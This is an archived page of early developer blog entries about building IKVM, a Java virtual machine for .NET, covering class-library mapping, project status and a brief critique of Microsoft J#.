<P><FONT face="Courier, Monospace" size=1>public class Starter<BR>{<BR>&nbsp;static void Main(string[] args)<BR>&nbsp;{<BR>&nbsp;&nbsp;JVM.Init();<BR>&nbsp;&nbsp;string[] vmargs = new string[args.Length - 1];<BR>&nbsp;&nbsp;for(int i = 1; i &lt; args.Length; i++)<BR>&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;vmargs[i - 1] = args[i];<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;Type type = Type.GetType(args[0], true);<BR>&nbsp;&nbsp;MethodInfo main = type.GetMethod("main");<BR>&nbsp;&nbsp;main.Invoke(null, new object[] { vmargs });<BR>&nbsp;}<BR>}</FONT></P>
<P><EM>I suspect the hardest part will be handling the class libraries - in particular three classes: Object, String, and Exception.</EM></P>
<P>Exactly. Mapping java.lang.Object to System.Object turns out to be easy, they have the exact same virtual methods, but in order for this to work java.lang.String also has to be mapped to System.String, since string is final, not much to worry about (methods can be redirected to static helpers), except for one thing: interfaces. If java.lang.String implements an interface, System.String should implement the equivalent interfaces. In JDK 1.4 java.lang.String implements: Serializable, Comparable and CharSequence. Serializable has no methods, so it's not a big deal. Comparable maps nicely to System.IComparable, so that's easy, but CharSequence is a problem, System.String doesn't have that, so that interface will probably have to be emulated via some reflection hack. Of course, at the moment I'm aiming for JDK 1.1 compatibility, so it's not really an issue yet :-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/20/2002 10:36:27 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 19 June 2002</h2></div>
<div class="newsItems"><a name="a5"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>Download</STRONG></P>
<P>It'll be a while before the code becomes available in any structured format, but for the time being I'll post a <A href="http://www.frijters.net/ikvm.zip">snapshot</A> every once in a while. I haven't decided on a license yet,&nbsp;any thoughts on that&nbsp;topic&nbsp;are appreciated.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/19/2002 14:36:15 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5">Comments [3]</a>
		
		<br clear="all">
	</div>
</div><a name="a4"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>Current Status</STRONG></P>
<P>What I currently have is:</P>
<UL>
<LI>java/lang/Object to System.Object &amp; java/lang/String to System.String mapping</LI>
<LI>On&nbsp;demand&nbsp;class loading infrastructure (but no ClassLoader support)</LI>
<LI>Code to read and parse Java .class files</LI>
<LI>Compiler that parses (small subset) of Java bytecode and converts it into MSIL</LI>
<LI>Small subset of JNI support (calling native methods &amp; calling Java from native code)</LI></UL>
<P><STRONG>What is needed</STRONG></P>
<UL>
<LI>Exception object model mapping&nbsp;needs to be worked out</LI>
<LI>Bytecode parser needs much improvement</LI>
<LI>Classpath native code needs to be written</LI>
<LI>Classpath VM interface needs to be investigated and&nbsp;adapted where necessary</LI>
<LI>ClassLoader support</LI>
<LI>Flesh out JNI support</LI>
<LI>Testing, testing and more testing</LI>
<LI>Documentation<BR></LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/19/2002 12:43:40 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="a3"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>What about J#?</STRONG></P>
<P>When I looked at beta 1 of J#, I found so many bugs in the first day of playing with it, that I decided to report the bugs to Microsoft and then ignore the product until the next beta. When beta 2 arrived,&nbsp;two of bugs I reported hadn't been fixed, but I decided to go ahead and play with it for a couple of days anyways. What I found was devastating: The J# object model is <STRONG>fundamentally broken</STRONG>. In order for it to function, it <STRONG>requires</STRONG> a huge <STRONG>security hole</STRONG>. I reported this to Microsoft and gave up on the tool. Since then I've been looking for an alternative, but recently I finally decided to build my own JVM for .NET.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/19/2002 12:22:26 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3">Comments [3]</a>
		
		<br clear="all">
	</div>
</div><a name="a2"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>What is I&lt;&lt;K.VM.NET?</STRONG></P>
<P>I&lt;&lt;K.VM.NET&nbsp;is&nbsp;a Java VM implemented in .NET. The goal is to implement a fully functional JVM. Initialy, I'll probably be aiming at the JDK 1.1 compatibility level, but in the future newer versions should be possible.</P>
<P><STRONG>How does it work?</STRONG></P>
<P>Java .class files are converted just-in-time to .NET classes. This enables me to take advantage of the .NET JIT compiler and GC. The Java class library that will be used is <A href="http://www.classpath.org/">GNU Classpath</A>.</P>
<P><STRONG>Why?</STRONG></P>
<P>I have a large Java application that I would like to slowly migrate to .NET, in order to be able to do that, I need a way to interoperate with Java code, the existing solutions I have looked at are inadequate. Besides, It's lots of fun to build something like this :-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/19/2002 12:17:37 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a1"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>Finally started blogging</STRONG></P>
<P>After several false starts, I finally decided to start blogging seriously, using Radio. I'd built&nbsp;a (broken) prototype&nbsp;blogging engine in ASP.NET, but that just didn't work well enough to be used seriously.</P>
<P>The reason I'm starting this blog, is to act as documentation of the development of I&lt;&lt;K.VM.NET, which is the current working title of my Java VM for .NET.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/19/2002 11:52:37 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div> 
</div>

<div class=sidebar id=rightBar>
	<div align="center">
		<table id="weblogCalendar" class="hCalendarStyle" cellspacing="0" cellpadding="2" border="0">
	<tr><td colspan="7"><table class="hCalendarMonthYearRow" cellspacing="0" border="0">
		<tr><td class="hCalendarNextPrevStyle"><a href="javascript:__doPostBack('weblogCalendar','V5053')">&lt;</a></td><td align="Center">2013 December</td><td class="hCalendarNextPrevStyle" align="Right"><a href="javascript:__doPostBack('weblogCalendar','V5114')">&gt;</a></td></tr>
	</table></td></tr><tr><td class="hCalendarDayNameRow" align="Center">Sun</td><td class="hCalendarDayNameRow" align="Center">Mon</td><td class="hCalendarDayNameRow" align="Center">Tue</td><td class="hCalendarDayNameRow" align="Center">Wed</td><td class="hCalendarDayNameRow" align="Center">Thu</td><td class="hCalendarDayNameRow" align="Center">Fri</td><td class="hCalendarDayNameRow" align="Center">Sat</td></tr><tr><td class="hCalendarOtherMonthWeekendStyle" align="Center">24</td><td class="hCalendarOtherMonthStyle" align="Center">25</td><td class="hCalendarOtherMonthStyle" align="Center">26</td><td class="hCalendarOtherMonthStyle" align="Center">27</td><td class="hCalendarOtherMonthStyle" align="Center">28</td><td class="hCalendarOtherMonthStyle" align="Center">29</td><td class="hCalendarOtherMonthWeekendStyle" align="Center">30</td></tr><tr><td class="hCalendarWeekendStyle" align="Center">1</td><td class="hCalendarDay" align="Center">2</td><td class="hCalendarDay" align="Center">3</td><td class="hCalendarDay" align="Center">4</td><td class="hCalendarDay" align="Center">5</td><td class="hCalendarDay" align="Center">6</td><td class="hCalendarWeekendStyle" align="Center">7</td></tr><tr><td class="hCalendarWeekendStyle" align="Center">8</td><td class="hCalendarDay" align="Center">9</td><td class="hCalendarDay" align="Center">10</td><td class="hCalendarDay" align="Center">11</td><td class="hCalendarDay" align="Center">12</td><td class="hCalendarDay" align="Center">13</td><td class="hCalendarDayCurrent" align="Center">14</td></tr><tr><td class="hCalendarWeekendStyle" align="Center">15</td><td class="hCalendarDay" align="Center">16</td><td class="hCalendarDay" align="Center">17</td><td class="hCalendarDay" align="Center">18</td><td class="hCalendarDay" align="Center">19</td><td class="hCalendarDay" align="Center">20</td><td class="hCalendarWeekendStyle" align="Center">21</td></tr><tr><td class="hCalendarWeekendStyle" align="Center">22</td><td class="hCalendarDay" align="Center">23</td><td class="hCalendarDay" align="Center">24</td><td class="hCalendarDay" align="Center">25</td><td class="hCalendarDay" align="Center">26</td><td class="hCalendarDay" align="Center">27</td><td class="hCalendarWeekendStyle" align="Center">28</td></tr><tr><td class="hCalendarWeekendStyle" align="Center">29</td><td class="hCalendarDay" align="Center">30</td><td class="hCalendarDay" align="Center">31</td><td class="hCalendarOtherMonthStyle" align="Center">1</td><td class="hCalendarOtherMonthStyle" align="Center">2</td><td class="hCalendarOtherMonthStyle" align="Center">3</td><td class="hCalendarOtherMonthWeekendStyle" align="Center">4</td></tr>
</table>
	</div>
	<br />
	<div class="section">
	<h3>Events</h3>
	</div>
	<div class="section">
	<h3>Links</h3>
	<div class="navigatorLinksContainerStyle"><table class="navigatorLinksTableStyle" border="0">
	<tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="https://nuget.org/packages/IKVM">Official nuget package</a></td>
	</tr><tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="https://sourceforge.net/apps/mediawiki/ikvm/">Wiki</a></td>
	</tr><tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="http://www.ikvm.net/">IKVM.NET Web Site</a></td>
	</tr><tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="mailto:jeroen@frijters.net">Contact</a></td>
	</tr><tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="/">Home</a></td>
	</tr><tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="https://sourceforge.net/apps/mediawiki/ikvm/index.php?title=FAQ">F.A.Q.</a></td>
	</tr><tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="http://sourceforge.net/mail/?group_id=69637">Mailing List</a></td>
	</tr><tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="http://sourceforge.net/projects/ikvm/">IKVM.NET on SourceForge</a></td>
	</tr><tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="http://sourceforge.net/project/showfiles.php?group_id=69637">Downloads</a></td>
	</tr><tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="https://sourceforge.net/apps/mediawiki/ikvm/index.php?title=License">License</a></td>
	</tr><tr>
		<td class="navigatorLinksCellStyle"><a class="navigatorLinksLinkStyle" href="allentries.aspx">All Entries</a></td>
	</tr>
</table></div> </div>
	<div class="section">
	<h3>Admin</h3>
	
<div class="signInContainerStyle" id="login">
	<table class="signInTableStyle">
		<tr>
			<td class="signInLabelCellStyle"><span id="_ctl3997_Label1">Username</span></td>
			<td class="signInEditCellStyle"><input name="_ctl3997:username" type="text" id="_ctl3997_username" class="signInUsernameTextBoxStyle" /></td>
		</tr>
		<tr>
			<td class="signInLabelCellStyle" style="HEIGHT: 25px"><span id="_ctl3997_Label2">Password</span></td>
			<td class="signInEditCellStyle" style="HEIGHT: 25px"><input name="_ctl3997:password" type="password" id="_ctl3997_password" class="signInPasswordTextBoxStyle" /></td>
		</tr>
		<tr>
			<td class="signInEditCellStyle" colSpan="2"><span class="signRememberCheckBoxStyle"><input id="_ctl3997_rememberCheckbox" type="checkbox" name="_ctl3997:rememberCheckbox" /><label for="_ctl3997_rememberCheckbox">Remember Login</label></span>&nbsp;&nbsp;<input type="submit" name="_ctl3997:doSignIn" value="Sign In" id="_ctl3997_doSignIn" class="signInButtonStyle" />
			</td>
		</tr>
		
	</table>
</div>

	</div>
</div>

<div id="footer">
    <p id="copyright">Content &copy; 2013 Jeroen Frijters | Subscribe to my <a class="rssLinkStyle" href="http://weblog.ikvm.net/SyndicationService.asmx/GetRss"><img title="RSS 2.0" class="rssLinkImageStyle" src="images/rssButton.gif" alt="RSS 2.0" border="0" /></a> feed.</p>
    <p id="poweredBy">Powered by newtelligence dasBlog 1.5.3337.0</p>
</div>
</base>
</form></body>
</html>
